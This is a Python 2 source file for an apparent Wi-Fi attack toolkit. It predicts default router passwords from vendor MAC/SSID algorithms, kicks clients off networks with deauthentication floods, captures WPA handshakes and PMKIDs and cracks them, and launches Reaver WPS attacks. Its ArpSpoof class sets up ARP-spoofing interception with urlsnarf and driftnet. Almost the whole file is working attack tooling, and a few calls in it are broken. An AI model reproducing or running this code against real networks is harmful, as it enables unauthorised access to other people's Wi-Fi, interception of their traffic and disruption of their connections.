import re, os, sys, time, urllib3
import GenPwdList, TColors
TColors = TColors.TColors(); Colors = TColors.Colors
urllib3.disable_warnings()

def listFiles(dir = ".", ext = ""):
    os.system("ls %s/ > %s/ls" % (dir, dir))
    ls = open("%s/ls" % dir); files = []
    for line in ls:
        if ext.lower() in line.lower(): files.append(dir + "/" + line.replace("\n", ""))
    ls.close()
    return files

def possiblePassword(bssid, essid, encryption, manuf):
    if encryption and encryption[0] == "None": return "Open"
    if essid[:6] in ["DG860A", "TG862G"]: return essid[:6] + "".join(bssid.split(":")[3:5]) + essid[6:8]
    if essid[:7] in ["DG1670A", "TC8715D", "TC8717T", "TG1672G"]: return essid[:7] + "".join(bssid.split(":")[3:5]) + essid[7:9]
    if essid[:7] in ["DDW3611", "SBG6580"]: return essid[:7] + "".join(bssid.split(":")[3:])
    if "ATT-HOMEBASE-" in essid and len(essid) == 17: return "8-digits"
    if "belkin." in essid and (len(essid) == 10 or len(essid) == 11):
        mac8 = bssid.split(":")[-4:]; mac8[3] = hex(int(mac8[3], base = 16) + 1)[2:].upper()
        scramble8 = mac8[2][1] + mac8[0][1] + mac8[1][0] + mac8[3][1] + mac8[2][0] + mac8[0][0] + mac8[3][0] + mac8[1][1]
        conversion_chart = ("0123456789ABCDEF", "944626378ace9bdf"); cracked_string = ""
        for char in scramble8:
            cracked_string += conversion_chart[1][conversion_chart[0].index(char)]
        return cracked_string
    if "Belkin." in essid and (len(essid) == 11 or len(essid) == 13):
        mac8 = bssid.split(":")[-4:]
        conversion_chart = ("0123456789ABCDEF", "024613578ACE9BDF")
        scramble8 = mac8[2][1] + mac8[0][1] + mac8[1][0] + mac8[3][1] + mac8[2][0] + mac8[0][0] + mac8[3][0] + mac8[1][1]
        cracked_string = ""
        for char in scramble8:
            cracked_string += conversion_chart[1][conversion_chart[0].index(char)]
        return cracked_string
    if "DDW365." in essid and len(essid) == 18: return "S/N"
    if "Fios-" in essid and len(essid) == 9 and essid[5:9] == essid[5:9].upper(): return "noun+3-digits+noun+2-digits+noun"
    if "Fios-" in essid and len(essid) == 10 and essid[5:10] == essid[5:10].upper(): return "adj+4-digits+noun+2-digits+noun"
    if "FiOS-" in essid and len(essid) >= 10 and essid[5:10] == essid[5:10].upper(): return "adj+4-digits+noun+3-digits"
    if essid[:7] in ["IBR1100", "IBR200-", "IBR600-", "IBR900-"] and (len(essid) == 10 or len(essid) == 11): return "".join(bssid.split(":")[2:]).lower()
    if "Linksys" in essid and len(essid) >= 12: return "vivint" + essid[7:12]
    if "MySpectrumWiFi" in essid and len(essid) == 19: return "adj+noun+3-digits"
    if "NETGEAR" in essid and len(essid) == 9: return "adj+noun+3-digits"
    if "ORBI" in essid and len(essid) == 6 and essid == essid.upper(): return "adj+noun+3-digits"
    if "SpectrumSetup-" in essid and len(essid) == 16: return "noun+verb+3-digits"
    if "TP-LINK_" in essid and len(essid) == 14: return "".join(bssid.split(":")[2:])
    if "WIFI-" in essid and len(essid) == 9 and essid == essid.upper(): return "8-digits"
    if "WIFI" in essid and len(essid) == 10 and essid == essid.upper(): return "16-chars [A-Z,0-9]"
    if manuf == "Actiontec Electronics, Inc" and len(essid) == 5 and essid == essid.upper(): return "16-chars [A-Z,0-9]"
    if manuf == "ARRIS Group, Inc." and essid[:7] not in ["DG1670A", "TC8715D", "TC8717T", "TG1672G"] and "WPA+TKIP" not in encryption:
        return "TG1672G" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) + 2)).replace("x", "").upper() + \
            "<br>" + "DG1670A" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) + 2)).replace("x", "").upper()
    if manuf == "CradlePoint, Inc": return "".join(bssid.split(":")[2:]).lower()
    if manuf == "Technicolor CH USA Inc." and essid[:7] not in ["DG1670A", "TC8715D", "TC8717T", "TG1672G"]:
        return "DG1670A" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) - 6)).replace("x", "").upper() + \
            "<br>" + "TC8715D" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) - 6)).replace("x", "").upper() + \
            "<br>" + "TC8717T" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) - 6)).replace("x", "").upper()
    return ""


def selectFile(files):
    for i, name in enumerate(files):
        print "  %-3s %s" % (i + 1, name)
    x = re.sub("[^0-9]", "", raw_input("\nSelect file: "))
    return files[int(x) - 1] if x.isdigit() else None

class AirCrack:
    def __init__(self):
        pass

    def selectInterface(self):
        while True:
            os.system("airmon-ng | grep wlan > airmon-ng.txt")
            airmon_txt = open("airmon-ng.txt", "r"); os.system("rm airmon-ng.txt")
            interfaces = []; max_chip_len = 0
            for line in airmon_txt:
                data = line.split(); chipset = " ".join(data[3:])
                if len(chipset) > 0: max_chip_len = len(chipset)
                interfaces.append([data[1], data[2], chipset])
            print ""
            print "  %s %-10s %-12s %s" % ("#", "Interface", "   Driver   ", " Chipset ")
            print "  %s %-10s %-12s %s" % ("-", "-" * 10, "-" * 12, "-" * max_chip_len)
            for i, interface in enumerate(interfaces):
                print "  %s %-10s %-12s %s" % (i + 1, " " + interface[0], " " + interface[1], interface[2])
            print ""
            try: return interfaces[int(raw_input("Select Wireless Interface: ")) - 1][0]
            except IndexError: print "\nWireless Interface Does Not Exist...\n"
            except KeyboardInterrupt: return False
            except ValueError: print "\nInvalid Input...\n"

    def scanNetworks(self, wlanx):
        if not wlanx: return False
        wlanxmon = wlanx
        if "mon" not in wlanx: os.system("airmon-ng start %s > /dev/null 2>&1" % wlanx); wlanxmon = wlanx + "mon"
        print "\nScanning For Wireless Networks...\n\nPress CTRL+C To Stop Scannning...\n"
        os.system("airodump-ng %s --output-format cap,netxml -w listener" % wlanxmon)
        return "listener-01.kismet.netxml"

    def passiveListener(self, wlanx):
        if not wlanx: return False
        wlanxmon = wlanx
        if "mon" not in wlanx: os.system("airmon-ng start %s > /dev/null 2>&1" % wlanx); wlanxmon = wlanx + "mon"
        while True:
            timestamp = str(time.ctime()).replace(" ", "_")
            print "\nScanning For Wireless Networks...\n\nPress CTRL+C To Stop Scannning...\n"
            os.system("airodump-ng %s --output-format cap,netxml -w listener;" % wlanxmon)
            os.system("mv listener-01.cap 'captures/%s.cap';" % timestamp)
            os.system("mv listener-01.kismet.netxml 'netxml/%s.kismet.netxml'" % timestamp)
            try: raw_input("\nPress CTRL+C to quit, else press ENTER to loop again.")
            except KeyboardInterrupt: return False

    def xmlParser(self, netxml):
        if not netxml: return False
        netxml_file = " ".join(open(netxml).read().split())
        networks = re.findall(re.compile("<wireless-network (.*?)</wireless-network>"), netxml_file)
        os.system("mv listener*.cap listeners/listener_%s.cap" % int(time.time()))
        os.system("rm listener*.*")
        wireless_networks = []; unique_bssids = []
        for network in networks:
            ssid = re.findall(re.compile("<SSID (.*?)</SSID>"), network)[0] if re.findall(re.compile("<SSID (.*?)</SSID>"), network) else ""
            encryption = re.findall(re.compile("<encryption>(.*?)</encryption>"), ssid)
            encryption = encryption[0] if len(encryption) > 1 else "Open"
            encryption = encryption.split("+")[0] + "2" if "+" in encryption else encryption
            auth = encryption.split("+")[1] if "+" in encryption else "None" if encryption == "WEP" else "Open"
            wps = "wps" if auth == "TKIP" else "none"
            essid = re.findall(re.compile('<essid cloaked="(.*?)">'), network)
            essid = re.findall(re.compile('<essid cloaked="false">(.*?)</essid>'), network)[0] if essid and essid[0] == "false" else "(Hidden Network)"
            bssid = re.findall(re.compile("<BSSID>(.*?)</BSSID>"), network)[0].upper()
            manuf = re.findall(re.compile("<manuf>(.*?)</manuf>"), network)[0]
            channel = re.findall(re.compile("<channel>(.*?)</channel>"), network)[0]; channel = " " + channel if len(channel) == 1 else channel
            signal = re.findall(re.compile("<last_signal_dbm>(.*?)</last_signal_dbm>"), network)[0]; signal = "-100" if signal == "0" else signal
            wireless_clients = re.findall(re.compile("<wireless-client (.*?)</wireless-client>"), network)
            client_macs = []; client_manufs = []; clients = " 0"
            if wireless_clients:
                clients = " " + str(len(wireless_clients)) if len(wireless_clients) < 10 else str(len(wireless_clients))
                for client in wireless_clients:
                    client_macs.append(re.findall(re.compile("<client-mac>(.*?)</client-mac>"), client))
                    client_manufs.append(re.findall(re.compile("<client-manuf>(.*?)</client-manuf>"), client))
            if bssid not in unique_bssids:
                unique_bssids.append(bssid)
                wireless_networks.append({
                    "Auth": auth, "BSSID": bssid, "Channel" : channel, "CheckWPS": wps,
                    "ClientMACs": client_macs, "ClientManufs": client_manufs, "Clients": clients,
                    "Encryption": encryption, "ESSID": essid, "Manuf": manuf, "Signal": signal
                })
        if wireless_networks: wireless_networks = sorted(wireless_networks, key = lambda x: int(x["Signal"]))[::-1]
        return wireless_networks

    def selectXMLs(self):
        xmls = listFiles(dir = "netxml", ext = ".netxml")
        os.system("find . -type f -name *.netxml > netxml.txt")
        netxml_paths = []; max_char = 20
        netxml = open("netxml.txt")
        for line in netxml:
            print line
            path = line.split("/")[2:]
            print path
            if len("/".join(path).replace("\n", "")) >= max_char: max_char = len("/".join(path).replace("\n", ""))
            if len(path) == 1: netxml_paths.append(path[0].replace("\n", ""))
            if len(path) == 2: netxml_paths.append(path[0] + "/" + path[1].replace("\n", ""))
            if len(path) == 3: netxml_paths.append(path[0] + "/" + path[1] + "/" + path[2].replace("\n", ""))
        os.system("rm netxml.txt")
        print "\n     -------- KismetNetXML Parser --------     \n"
        print "  %-3s  %s" % ("---", "-" * max_char)
        for i in range(len(netxml_paths)):
            print "  %-3s  %s" % (str(i + 1) + ".", netxml_paths[i])
        print ""
        netxmls = []
        for index in raw_input("Enter Options [Separate by Commas]: ").split(","):
            try:
                i = int(re.sub("[^0-9]", "", index)) - 1
                if i in range(len(netxml_paths)): netxmls.append("netxml/" + netxml_paths[i])
            except: pass
        return list(set(netxmls))

    def sortNetworks(self, wireless_networks):
        if not wireless_networks: return False
        print """
        \t%s Networks Found, Sort By...?\n
          %-3s Signal Strength (Default)
          %-3s Network Name (ESSID)
          %-3s Channel Number
          %-3s Encryption (OPEN/WPA2)
          %-3s Access Point (BSSID)
          %-3s Authentication Type (NONE/PSK/MGT)
          %-3s WPS Available?
          %-3s Length of ESSID
          %-3s Number of Client(s)
          %-3s Router Manufacturer\n
          """ % tuple([len(wireless_networks)] + ["%s." % i for i in range(1, 11)])
        try:
            i = raw_input("Select Sorting Option: ")
            if i == "1": return sorted(wireless_networks, key = lambda x: int(x["Signal"].split()[0]))[::-1]
            if i == "2": return sorted(wireless_networks, key = lambda x: x["ESSID"])
            if i == "3": return sorted(wireless_networks, key = lambda x: int(x["Channel"]))
            if i == "4": return sorted(wireless_networks, key = lambda x: x["Encryption"])
            if i == "5": return sorted(wireless_networks, key = lambda x: x["BSSID"])
            if i == "6": return sorted(wireless_networks, key = lambda x: x["Auth"])
            if i == "7": return sorted(wireless_networks, key = lambda x: x["CheckWPS"])[::-1]
            if i == "8": return sorted(wireless_networks, key = lambda x: len(x["ESSID"]))
            if i == "9": return sorted(wireless_networks, key = lambda x: x["Clients"])[::-1]
            if i == "10": return sorted(wireless_networks, key = lambda x: x["Manuf"])
            print "\n\tInvalid Input... Sorting Networks by Signal Strength (Default)...\n"
            return wireless_networks
        except: return False

    def selectNetwork(self, wireless_networks):
        if not wireless_networks: return False
        sorted_networks = wireless_networks
        while True:
            if not sorted_networks: return False
            print "\n\t----- Select WiFi Network -----\n"
            if "pi" in sys.argv:
                print " %-3s %-20s %-4s %-4s %-4s %-2s %-18s" % (" # ", "Network Name (ESSID)", "PWR!", "ENCR", "WPS?", "CL", "Possible Password")
                print " %-3s %-20s %-4s %-4s %-4s %-2s %-18s" % ("-" * 3, "-" * 20, "-" * 4, "-" * 4, "-" * 4, "-" * 2, "-" * 18)
            else:
                print " %-3s %-20s %-2s %-4s %-4s %-19s %-4s %-4s %-2s %-24s %-18s" % (
                    " # ", "Network Name (ESSID)", "CH", "PWR!", "ENCR",
                    "MAC Address (BSSID)", "AUTH", "WPS?", "CL", "Router Manufacturer", "Possible Password")
                print " %-3s %-20s %-2s %-4s %-4s %-19s %-4s %-4s %-2s %-24s %-18s" % (
                    "-" * 3, "-" * 20, "-" * 2, "-" * 4, "-" * 4,
                    "-" * 19, "-" * 4, "-" * 4, "-" * 2, "-" * 24, "-" * 18)
            for i, network in enumerate(sorted_networks):
                essid = network["ESSID"]; bssid = network["BSSID"]
                channel = network["Channel"]
                pwr = network["Signal"]; encryption = network["Encryption"]
                auth = network["Auth"]; check_wps = network["CheckWPS"]
                clients = network["Clients"]
                if "pi" in sys.argv:
                    print " %s%-3s%s %s%-20s%s %s%-4s%s %s%-4s%s %s%-4s%s %s%-2s%s %s%-18s%s" % (
                        Colors["yellow"], i + 1, Colors["end"],
                        Colors["cyan"], essid[:20], Colors["end"],
                        Colors["green"] if int(pwr) >= -70 else Colors["yellow"] if int(pwr) >= -80 else Colors["red"], pwr, Colors["end"],
                        Colors["cyan"] if encryption == "WPA2" else Colors["green"], encryption, Colors["end"],
                        Colors["green"] if check_wps == "wps" else Colors["red"], check_wps, Colors["end"],
                        Colors["green"] if int(clients) else Colors["red"], clients, Colors["end"],
                        Colors["yellow"], RouterPwn().wpaCracker(bssid, essid), Colors["end"])
                else:
                    print " %s%-3s%s %s%-20s%s %s%-2s%s %s%-4s%s %s%-4s%s %s%-19s%s %s%-4s%s %s%-4s%s %s%-2s%s %s%-24s%s %s%-18s%s" % (
                        Colors["yellow"], i + 1, Colors["end"],
                        Colors["cyan"], essid[:20], Colors["end"],
                        Colors["blue"], channel, Colors["end"],
                        Colors["green"] if int(pwr) >= -70 else Colors["yellow"] if int(pwr) >= -80 else Colors["red"], pwr, Colors["end"],
                        Colors["cyan"] if encryption == "WPA2" else Colors["green"], encryption, Colors["end"],
                        Colors["magenta"], " " + bssid, Colors["end"],
                        Colors["yellow"] if auth == "TKIP" else Colors["red"] if auth == "MGT" else Colors["cyan"] if auth == "PSK" else Colors["green"], auth, Colors["end"],
                        Colors["green"] if check_wps == "wps" else Colors["red"], check_wps, Colors["end"],
                        Colors["green"] if int(clients) else Colors["red"], clients, Colors["end"],
                        Colors["blue"], network["Manuf"][:24], Colors["end"],
                        Colors["yellow"], RouterPwn().wpaCracker(bssid, essid), Colors["end"])
            try: return sorted_networks[int(raw_input("\nSelect WiFi Network #: ")) - 1]
            except IndexError: sorted_networks = self.sortNetworks(wireless_networks)
            except KeyboardInterrupt: return False
            except ValueError: sorted_networks = self.sortNetworks(wireless_networks)

    def deviceListener(self, wlanxmon, bssid, channel):
        os.system("airodump-ng -c %s --bssid %s --output-format netxml -w devices %s" % (channel, bssid, wlanxmon))
        netxml = " ".join(open("devices-01.kismet.netxml").read().split()); os.system("rm devices*")
        client_macs = re.findall(re.compile("<client-mac>(.*?)</client-mac>"), netxml)
        client_manufs = re.findall(re.compile("<client-manuf>(.*?)</client-manuf>"), netxml)
        print "\n\tMy Device MAC - %s\n" % MyNetwork().MyDeviceMAC()
        print " %-3s %-17s %s" % (" # ", "   MAC Address   ", " Device Manufacturer ")
        print " %-3s %-17s %s\n" % ("-" * 3, "-" * 17 , "-" * 36)
        for i in range(len(client_macs)):
            print " %-3s %17s %s" % (str(i + 1) + ".", client_macs[i], " " + client_manufs[i])
        print ""
        try:
            if "Y" in raw_input("Would You Like To Kick Some Devices? [Y/N]: ").upper():
                q = raw_input("Select Device(s) # [Separate by Comma || 'all']: "); indexes = []
                if "ALL" in q.upper(): indexes = range(len(client_macs))
                if "ALL" not in q.upper():
                    for i in q.replace(" ", "").split(","):
                        if i.isdigit() and int(i) - 1 < len(client_macs): indexes.append(int(i) - 1)
                if indexes:
                    count = raw_input("Enter Deauth Count (Max: 10): ")
                    count = re.sub("[^0-9]", "", count)
                    if count and count.isdigit():
                        count = 10 if int(count) > 10 else int(count)
                    else: return False
                    print ""
                    for c in range(count):
                        for i in indexes:
                            os.system("aireplay-ng -0 2 -a %s -c %s %s" % (bssid, client_macs[i], wlanxmon))
        except: return False
        return True

    def getHandshakes(self, wlanx, selected_network = False):
        if not wlanx: return False
        wlanxmon = wlanx
        if "mon" not in wlanx: os.system("airmon-ng start %s > /dev/null 2>&1" % wlanx); wlanxmon = wlanx + "mon"
        target_network = selected_network
        if not target_network:
            print "\nScanning For Target Devices...\n\nPress CTRL+C To Stop Scannning...\n"
            target_networks = []; wireless_networks = self.xmlParser(self.scanNetworks(wlanx))
            for wireless_network in wireless_networks:
                if int(wireless_network["Clients"]) and wireless_network["BSSID"] not in str(target_networks):
                    target_networks.append(wireless_network)
            target_networks = sorted(target_networks, key = lambda x: x["Clients"])[::-1]
            target_network = self.selectNetwork(target_networks)
            if not target_network: return False

        bssid = target_network["BSSID"]; channel = target_network["Channel"]; essid = target_network["ESSID"]
        essid_bssid = essid.replace(" ", "_") + "_" + bssid
        print "\n\n"
        if os.path.isfile("handshakes/%s.cap" % essid_bssid):
            if "Y" not in raw_input("'%s.cap' already exists... Continue? [Y/N]: " % essid_bssid).upper():
                if "Y" in raw_input("Use existing handshake? [Y/N]: ").upper():
                    return essid_bssid + ".cap"
                return False
        self.deviceListener(wlanxmon, bssid, channel)
        os.system("airodump-ng -c %s --bssid %s --output-format cap -w handshakes/%s %s" % (channel, bssid, essid_bssid, wlanxmon))
        os.system("aircrack-ng -a2 -w 'wordlists/default.txt' handshakes/%s-01.cap > handshakes/aircrack.txt" % essid_bssid)
        if "with PMKID" in open("handshakes/aircrack.txt", "r").read():
            os.system("mv handshakes/%s-01.cap handshakes/%s_PMKID.cap" % (essid_bssid, essid_bssid))
            print "\nPMKID Found...\n"
            return "handshakes/" + essid_bssid + "_PMKID.cap"
        if "0 handshake" in open("handshakes/aircrack.txt", "r").read(): print "\nNo valid WPA handshakes found\n"
        else:
            os.system("mv handshakes/%s-01.cap handshakes/%s.cap" % (essid_bssid, essid_bssid))
            print "\nHandshake Found...\n"
        # os.system("cat handshakes/aircrack.txt")
        os.system("rm handshakes/%s-* handshakes/aircrack.txt > /dev/null 2>&1" % essid_bssid)
        return "handshakes/" + essid_bssid + ".cap"


    def crackHandshakes(self, handshake = None):
        capture = handshake
        if not capture:
            captures = listFiles(dir = "handshakes", ext = ".cap")
            # captures += listFiles(dir ="captures", ext = ".cap")
            # captures += listFiles(dir ="listeners", ext = ".cap")
            if not captures: print "\nNo Captures Found...\n"; quit()
            print "\n\t------ Handshake Captures ------\n"
            capture = selectFile(captures)
        if not capture: print "\nNo Capture File Selected\n"; quit()
        wordlists = listFiles(dir = "wordlists", ext = ".txt")
        if not wordlists: print "\nNo Wordlists Found...\n"; quit()
        print "\n\t------ Wordlists ------\n"
        wordlist = selectFile(wordlists)
        if not wordlist: wordlist = "wordlists/default.txt"
        os.system("aircrack-ng -a2 -w '%s' '%s'" % (wordlist, capture))

    def wirelessOptions(self, selected_network):
        if not selected_network: return False
        wlanx = self.selectInterface()
        if not wlanx: return False
        if "mon" not in wlanx: os.system("airmon-ng start %s > /dev/null 2>&1" % wlanx)
        wlanx = wlanx.replace("mon", ""); wlanxmon = wlanx + "mon"
        selected_network.update({"WirelessInterface": [wlanx, wlanxmon]})
        bssid = selected_network["BSSID"]; channel = selected_network["Channel"]; signal = selected_network["Signal"]
        encryption = selected_network["Encryption"]; essid = selected_network["ESSID"]; auth = selected_network["Auth"]
        check_wps = selected_network["CheckWPS"]; clients = selected_network["Clients"]; manuf = selected_network["Manuf"];
        client_macs = selected_network["ClientMACs"]; client_manufs = selected_network["ClientManufs"]
        selected_network.update({"WirelessInterface": [wlanx, wlanxmon]})
        while True:
            print "\n%s\n" % ("-" * (len(essid) + len(bssid) + 30))
            print "----- ESSID: %s || BSSID: %s -----   " % (Colors["cyan"] + essid + Colors["end"], Colors["magenta"] + bssid + Colors["end"])
            print "\n%s----- WiFi Options -----\n" % (" " * (len(essid) / 2 + 12))
            print " 1. Listen For Connected Devices (Default)"
            print " 2. Connect To WiFi Network"
            print " 3. Crack WiFi Password"
            print ""; print " 9. Go Back"; print ""
            try:
                x = raw_input("Select WiFi Option: ")
                if x == "1": AirCrack().deviceListener(wlanxmon, bssid, Channel)
                elif x == "2": pass
                elif x == "3": self.crackWiFiMenu(selected_network)
                elif not x: pass
                elif x == "9": self.wirelessOptions(self.selectNetwork(self.sortNetworks(self.xmlParser(self.scanNetworks(wlanxmon)))))
            except KeyboardInterrupt: return False


    def crackWiFiMenu(self, selected_network):
        if not selected_network: return False
        wlanx, wlanxmon = selected_network["WirelessInterface"]
        bssid = selected_network["BSSID"]; channel = selected_network["Channel"]; signal = selected_network["Signal"]
        encryption = selected_network["Encryption"]; essid = selected_network["ESSID"]; auth = selected_network["Auth"]
        check_wps = selected_network["CheckWPS"]; clients = selected_network["Clients"]; manuf = selected_network["Manuf"];
        client_macs = selected_network["ClientMACs"]; client_manufs = selected_network["ClientManufs"]
        while True:
            print "\n\t----- WiFi Cracker Method -----\n"
            print " 1. Generic Router Algorithm"
            print " 2. Reaver v1.5.3 WPS Attack Tool"
            print " 3. AirCrack (Coming Soon)"
            print "\n 9. Go Back\n"
            try:
                x = raw_input("Select WiFi Cracker Method Option: ")
                if x == "1":
                    print "Possible Password: %s" % possiblePassword(bssid, essid, encryption, manuf)
                    return False
                elif x == "2": print; os.system("reaver -c %s -i %s -b %s -w -K 1 -L -vv" % (channel, wlanxmon, bssid)); print ""
                elif x == "3":
                    wordlist = "default.txt"
                    # if "ATT-WIFI-" in ESSID:
                    #     GenPwdList.ATT_WIFI(ESSID[-4:])
                    #     wordlist = ESSID.replace(" ", "_").replace("-", "_") + ".txt"
                    if essid[:7] in ["TG1672G", "TC8717T", "TC8715D", "DG1670A"]:
                        GenPwdList.ArrisRouter(essid)
                        # wordlist = essid + ".txt"
                    # if ESSID[:4] == "WIFI" and len(ESSID) == 10:
                    #     GenPwdList.WIFIXXXXXX(BSSID, ESSID)
                    #     wordlist = ESSID + ".txt"
                    handshake = self.getHandshakes(wlanx, selected_network = selected_network)
                    if handshake and "Y" in raw_input("Crack '%s'?: " % handshake).upper():
                        self.crackHandshakes(handshake); quit()

                    # if self.deviceListener(wlanxmon, BSSID, Channel):
                    #     os.system("airodump-ng -c 2 --bssid %s --output-format cap -w crack wlan1mon" % (BSSID))
                    #     os.system("aircrack-ng -a2 -b %s -w 'wordlists/%s' crack-01.cap" % (BSSID, wordlist))
                    # os.system("rm *.cap")
                elif not x: pass
                else: return False
            except KeyboardInterrupt: return False

class RouterPwn:

    def __init__(self):
        pass

    def checkPrefix(self, essid):
        prefixes = ["Belkin.", "belkin." "DDW3611", "DG1670A", "DG860A", "SBG6580", "TC8715D", "TC8717T", "TG1672G", "TG852G", "TP-LINK_"]
        for prefix in prefixes:
            if prefix in essid: return True

    def scramble8(self, mac8, conversion_chart):
        key = ""; scramble = mac8[2][1] + mac8[0][1] + mac8[1][0] + mac8[3][1] + mac8[2][0] + mac8[0][0] + mac8[3][0] + mac8[1][1]
        for char in scramble:
            key += conversion_chart[1][conversion_chart[0].index(char)]
        return key

    def wpaCracker(self, BSSID, ESSID):
        if not self.checkPrefix(ESSID): return ""
        conversion_chart = ["0123456789ABCDEF", "944626378ace9bdf"]
        key = ""; mac_split = BSSID.split(":")
        if len(ESSID) == 8: key = ESSID[:6] + "".join(mac_split[3:])
        elif len(ESSID) == 9:
            key = ESSID[:7]
            if "DDW" in ESSID or "SBG" in ESSID: key += "".join(mac_split[3:])
            else: key += "".join(mac_split[3:5]) + ESSID[-2:]
        elif len(ESSID) == 10:
            mac8 = mac_split[-4:]; mac8[3] = hex(int(mac8[3], base=16) + 1)[2:].upper()
            key = self.scramble8(mac8, conversion_chart)
        elif len(ESSID) == 11 or len(ESSID) == 13:
            mac8 = mac_split[-4:]
            if "belkin" in ESSID: mac8[3] = hex(int(mac8[3], base=16) + 1)[2:].upper()
            else: conversion_chart = ("0123456789ABCDEF", "024613578ACE9BDF")
            key = self.scramble8(mac8, conversion_chart)
        elif len(ESSID) == 14: key = "".join(mac_split[2:])
        return key

class ArpSpoof:
    def attack(self, wlanx, Target_Device):
        Local_IP = Target_Device["Local_IP"]
        RouterAddress = Target_Device["RouterAddress"]
        Client = Target_Device["Client"]
        os.system("echo $DESKTOP_SESSION > desktop.txt")
        checkGnome = open("desktop.txt", "r").read()
        if checkGnome.split()[0] != "gnome":
            print "\nSorry, Requires Gnome Desktop Enviromenet\n"; return False
        print "\nAttacking Target %s - %s ...\n" % (Local_IP, Client)
        raw_input("Enter To Continue...")
        os.system("gnome-terminal -x arpspoof -i %s -t %s %s" % (wlanx, RouterAddress, Local_IP))
        raw_input("Enter To Continue...")
        os.system("gnome-terminal -x arpspoof -i %s -t %s %s" % (wlanx, Local_IP, RouterAddress))
        raw_input("Enter To Continue...")
        os.system("gnome-terminal -x urlsnarf -i %s" % wlanx)
        raw_input("Enter To Continue...")
        os.system("gnome-terminal -x driftnet -i %s" % wlanx)


class MyNetwork:
    def bssid(self, wlanx):
        if not wlanx or "mon" in wlanx: return ""
        os.system("iwconfig %s | grep 'Access Point' > iwconfig.txt" % wlanx)
        iwconfig = " ".join(open("iwconfig.txt", "r").read().split()); os.system("rm iwconfig.txt")
        return iwconfig.split()[-1] if "NOT" not in iwconfig else ""

    def essid(self, wlanx):
        if not wlanx or "mon" in wlanx: return ""
        os.system("iwconfig %s | grep ESSID > iwconfig.txt" % wlanx)
        iwconfig = " ".join(open("iwconfig.txt", "r").read().split()); os.system("rm iwconfig.txt")
        return re.findall(re.compile('\"(.*?)\"'), iwconfig)[0] if len(re.sub("[^\"]", "", iwconfig)) == 2 else ""

    def deviceMAC(self):
        os.system("ethtool -P eth0 > eth0.txt")
        eth0 = open("eth0.txt", "r").read(); os.system("rm eth0.txt")
        return eth0.split()[-1].upper()

    def deviceName(self):
        os.system("echo $(uname -n) $(uname -s) > uname.txt")
        uname = open("uname.txt", "r").read(); os.system("rm uname.txt")
        return " ".join(uname.split()).title() + " (This Device)"

    def localIP(self, wlanx):
        if not wlanx or "mon" in wlanx: return ""
        os.system("ifconfig %s | grep inet.*broadcast > ifconfig.txt" % wlanx)
        ifconfig = open("ifconfig.txt", "r").read(); os.system("rm ifconfig.txt")
        return ifconfig.split()[1] if "inet" in ifconfig else ""

    def publicIP(self):
        try: return urllib3.PoolManager().request("GET", "https://RichardCazales.com/publicIP").data.split()[0]
        except urllib3.exceptions.MaxRetryError: print "\n%sConnection Timeout, No Internet :(%s\n" % (Colors["red"], Colors["end"])
        except Exception as e: print "%s" % e
        return False

    def localDevices(self, wlanx):
        if not wlanx or "mon" in wlanx: return ""
        print  "\n\tObtaining Network Info...\n"
        essid = self.essid(wlanx); print "\tNetwork Name (ESSID):", essid
        bssid = self.bssid(wlanx); print "\tMAC Address (BSSID):", bssid
        public_ip = self.publicIP()
        if public_ip: print "\tPublic I.P. Address:", public_ip
        else: print "Slow or No Connection..."; return False
        if not essid or not bssid: print "\nNot Connected To Any Network\n"; return ""
        print ""
        print "  %-3s %-42s %-15s %-19s %-10s %-8s %s" % (" # ", "          Client or Manufacturer          ", " Local Address ", "MAC Address (BSSID)", "  Port #  ", " Status ", "     Service     ")
        print "  %-3s %-42s %-15s %-19s %-10s %-8s %s" % ("-" * 3,"-" * 42, "-" * 15, "-" * 19, "-" * 10, "-" * 8, "-" * 17)
        os.system("arp-scan -l -I %s | grep %s > local_devices.txt" % (wlanx, self.localIP(wlanx).split(".")[0]))
        f = open("local_devices.txt", "a")
        f.write("%s %s %s\n" % (self.localIP(wlanx), self.deviceMAC(), self.deviceName()))
        f.close()
        local_devices = open("local_devices.txt", "r")
        sorted_local_devices = open("sorted_local_devices.txt", "w")
        key = lambda x: int(x.split()[0].split(".")[-1])
        for line in sorted(sorted(local_devices)[0:-1], key = key):
            sorted_local_devices.write(line)
        sorted_local_devices.close()
        organization = "(Unknown)"
        os.system("nohup whois %s > whois.txt 2>&1" % public_ip); whois = open("whois.txt", "r")
        for line in whois:
            if line.split() and line.split()[0] == "Organization:": Organization = " ".join(line.split()[1:])
        sorted_local_devices = open("sorted_local_devices.txt", "r")
        new_sorted_devices = open("new_sorted_devices.txt", "w")
        for line in sorted_local_devices:
            new_sorted_devices.write(line)
        new_sorted_devices.write("%s %s %s\n" % (public_ip, bssid, organization))
        sorted_local_devices.close(); new_sorted_devices.close()
        devices = []
        new_sorted_devices = open("new_sorted_devices.txt", "r")
        for i, line in enumerate(new_sorted_devices):
            data = line.split(); local_ip = data[0]; mac_address = data[1].upper(); client = " ".join(data[2:])
            if local_ip not in str(devices):
                os.system("nmap -T4 %s | grep 'open\|filtered\|MAC' > nmap_%s.txt" % tuple([local_ip] * 2))
                nmap_txt = open("nmap_%s.txt" % local_ip, "r")
                open_ports = []; filtered_ports = []
                for line in nmap_txt:
                    if "MAC" in line: client = re.sub("[()]", "", " ".join(line.split()[3:])) if "(" in line and ")" in line else client
                    if "open" in line: open_ports.append(line.split())
                    if "filtered" in line and len(line.split()) == 3: filtered_ports.append(line.split())
                devices.append({"Local_IP": local_ip, "MAC_Address": mac_address, "Client": client, "Ports": {"Open": open_ports, "Filtered": filtered_ports}})
                all_ports = open_ports + filtered_ports
                unique =[]
                device_option = str(i + 1) + "."
                if len(device_option) == 2: " " + device_option
                if not all_ports:
                    print "  %-3s %-42s %-15s %-19s" % (device_option, client[:42], local_ip, " %s " % mac_address)
                for j in range(len(all_ports)):
                    if local_ip not in unique:
                        unique.append(local_ip)
                        print "  %-3s %-42s %-15s %-19s %-10s %-8s %s" % (device_option, client[:42], local_ip, " %s " % mac_address, all_ports[j][0], all_ports[j][1], all_ports[j][2])
                    else:
                        print "  %-82s %-10s %-8s %s" % ("", all_ports[j][0], all_ports[j][1], all_ports[j][2])
        os.system("rm *.txt")
